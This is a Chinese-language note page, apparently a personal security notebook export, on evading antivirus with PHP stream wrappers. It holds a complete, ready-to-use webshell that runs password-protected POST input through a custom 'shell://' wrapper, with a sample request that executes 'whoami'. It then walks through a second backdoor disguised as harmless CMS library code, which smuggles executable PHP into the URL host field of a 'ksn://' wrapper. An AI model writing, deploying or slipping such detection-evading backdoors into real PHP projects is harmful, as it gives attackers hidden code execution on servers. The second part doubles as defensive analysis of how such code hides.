<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>自定义流包装器_免杀</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>自定义流包装器_免杀</h1><br/><a href="http://www.freebuf.com/articles/web/176571.html">http://www.freebuf.com/articles/web/176571.html</a><br /><br /><br /><div class="codebox"><div class="codebox">&lt;?php<br />class&nbsp;ShellStream<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;$position;<br />&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;$code;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;stream_open($path,&nbsp;$mode,&nbsp;$options,&nbsp;&amp;$opened_path)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$url&nbsp;=&nbsp;parse_url($path);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$name&nbsp;=&nbsp;$url[&quot;host&quot;];<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;code&nbsp;=&nbsp;base64_decode($name);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;position&nbsp;=&nbsp;0;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;true;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;stream_read($count)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ret&nbsp;=&nbsp;substr($this-&gt;code,&nbsp;$this-&gt;position,&nbsp;$count);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;position&nbsp;+=&nbsp;strlen($ret);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$ret;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;stream_tell()<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$this-&gt;position;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;stream_eof()<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$this-&gt;position&nbsp;&gt;=&nbsp;strlen($this-&gt;code);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;stream_seek($offset,&nbsp;$whence)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch&nbsp;($whence)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;SEEK_SET:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($offset&nbsp;&lt;&nbsp;strlen($this-&gt;code)&nbsp;&amp;&amp;&nbsp;$offset&nbsp;&gt;=&nbsp;0)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;position&nbsp;=&nbsp;$offset;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;true;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;false;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;SEEK_CUR:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($offset&nbsp;&gt;=&nbsp;0)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;position&nbsp;+=&nbsp;$offset;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;true;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;false;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;SEEK_END:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(strlen($this-&gt;code)&nbsp;+&nbsp;$offset&nbsp;&gt;=&nbsp;0)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;position&nbsp;=&nbsp;strlen($this-&gt;code)&nbsp;+&nbsp;$offset;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;true;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;false;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;false;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;include<br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;stream_stat()<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;stat(FILE);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;file&nbsp;exists<br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;url_stat(string&nbsp;$path,int&nbsp;$stat)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;stat(FILE);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;static&nbsp;function&nbsp;shell(){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stream_wrapper_register(&#39;shell&#39;,&nbsp;ShellStream::class);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(isset($_POST[&#39;password&#39;])&nbsp;&amp;&amp;&nbsp;$_POST[&#39;code&#39;])&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($_POST[&#39;password&#39;]==&#39;xzh&#39;)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$code&nbsp;=&nbsp;$_POST[&#39;code&#39;];<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;include&nbsp;&#39;shell://&#39;.$code;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;include&nbsp;&#39;shell://PD9waHAgZWNobyAiaGVsbG8gaGFjayI7&#39;;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br />ShellStream::shell();<br /><br />?&gt;</div></div><br /><br /><br /><br />使用：<br />post:<br />password=xzh&amp;code=PD9waHAgCmVjaG8gZXhlYygnd2hvYW1pJyk7<br /><br /><br /><br /><br /><br /><br /><br /><br /><h2>在Stream Wrapper中的后门</h2><br /><br /><br />之前的只是热身罢了，现在我们来看看更复杂的。<br /><br /><br />这次我们用 <em><strong>@package Stream.ksn.Libraries</strong></em>。我们不难推导出这里有个Stream类并和一个创建ksn协议流包装器的函数。<br /><code>class Stream { <br /> function stream_open($path, $mode, $options, &amp;$opened_path)<br /> {  $url = parse_url($path);<br /> $f = $_POST[&#39;d&#39;](&#39;&#39;, $url[&quot;host&quot;]); <br /> $f(); <br /> return true;<br /> } <br />}<br />stream_wrapper_register(&quot;ksn&quot;, &quot;Stream&quot;);<br />// Register connect the library Stream<br />$fp = fopen(&#39;ksn://&#39;.$_POST[&#39;f&#39;]($_POST[&#39;c&#39;]), &#39;&#39;);<br /></code>我们来用几个小节分析这个代码<br /><br /><br /><strong>代码貌似人畜无害</strong><br /><br /><br />对于一些开发者来讲，这个代码看上去像是那些第三方写的内容管理插件代码。<br /><br /><br />我们还不清楚它的具体作用，但是有些站长可能会默认它是合法代码。他们可能会通过其中的一小段来推测：是不是和ksn流相关呢？ksn又是什么呢？不管了，应该有用吧。<br /><br /><br />等等！我们在代码中看到了POST。因为攻击者总是可以操控它，因此对POST保持警惕。然而，我们不清楚POST具体的作用。<br /><br /><br /><br /><h2>探索与发现</h2><br /><br /><br />你玩过那些文字解密的游戏吗？这和我们做的十分相似。<br /><br /><br />我们先从 <em><strong>stream_open</strong></em> 分析：<br /><code>$f = $_POST[&#39;d&#39;](&#39;&#39;, $url[&quot;host&quot;]);<br /></code>当POST参数被用做函数名时，这引起了我们的关注。看上去 $_POST[&#39;d] 作用像之前的<em><strong>create_function</strong></em>。如果这样的话，<em><strong>$url[&#39;host&#39;]</strong></em>应该是可执行代码，但是一个经过 <em><strong>parse_url</strong></em>处理的函数应该包含不了代码吧？不过。。。<br /><br /><br /><strong>模糊化域名格式</strong><br /><br /><br />让我们看看传进 <em><strong>stream_open</strong></em> 的 <em><strong>$path</strong></em> —— 它包括了一个被 <em><strong>parse_url</strong></em> 解析过后的 <em><strong>URL</strong></em>，我们首先分析一下下列代码：<br /><code>stream_wrapper_register(&quot;ksn&quot;, Stream);<br /></code>这个函数将关联 ksn协议和Stream类。<strong>Stream</strong>类继承了<em><strong>streamWrapper</strong></em>的属性，也就是说<em><strong>wrapper</strong></em> 初始化完成时，<em><strong>stream_open</strong></em>会被直接调用。（比方说 <em><strong>fopen</strong></em> 该协议时）<br /><br /><br /><em><strong>stream_open</strong></em>应该是像如下一样被声明。其中，<em><strong>$path</strong></em>是被传递到<em><strong>fopen</strong></em>的URL<br /><code>public bool streamWrapper::stream_open ( string $path , string $mode , int $options , string &amp;$opened_path )<br /></code>我们可以用<em><strong>fopen</strong></em>来打开ksn://协议的url<br /><code>$fp = fopen(&#39;ksn://&#39;.$_POST[&#39;f&#39;]($_POST[&#39;c&#39;]), &#39;&#39;);<br /></code>所以我们的path就是：<br /><code>‘ksn://’.$_POST[‘f’]($_POST[‘c’]),’<br /></code><br /><br />这会构造一个可以让主机执行恶意代码的URL<br /><br /><br />那么我们应该如何构建一个可以被当做合法PHP代码执行的域名或者ip地址？<br /><br /><br />根据 RFC3986，我们并不需要构建合法的域名，因为<em><strong>parse_url</strong></em>不会检查URL的合法性，它只负责解析。任何从 :// 开始，以 / 或  : 结尾的那一部分字符串（如果没有的话，则是余下的全部字符）都被视作主机名部分。<br /><br /><br />比方说，如果你把 <em><strong>ksn://eval(base64_decode($_POST[“code”]));</strong></em>  传递给 <em><strong>parse_url</strong></em>，主机部分便是 <em><strong>eval(base64_decode($_POST[“code”]));</strong></em><br /><br /><br />就像之前那，我们此处可以理解：<br /><code>f=base64_decode<br />c=some_base64_encoded_malicious_PHP_code<br /></code>然后就会执行这样的<em><strong>fopen</strong></em>：<br /><code>$fp = fopen(&#39;ksn://base64_decode(base64_encoded_malicious_PHP_code)&#39;, &#39;&#39;);<br /></code>回过头来看 <em><strong>stream_open</strong></em>，我们可以知道被传入的URL<br /><code>$f = $_POST[&#39;d&#39;](&#39;&#39;, $url[&quot;host&quot;]);<br /></code>其实是：<br /><code>$f = create_function(&#39;&#39;, base64_decode(base64_encoded_malicious_PHP_code));<br /></code>到了最后，<em><strong>$f</strong></em> 会被调用：<br /><code>$f();<br /></code>简单来说，这个后门就是打开 ksn:// 协议的 <em><strong>fopen</strong></em> 引起的，然而我们仅粗略地读不会发现什么异常<br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>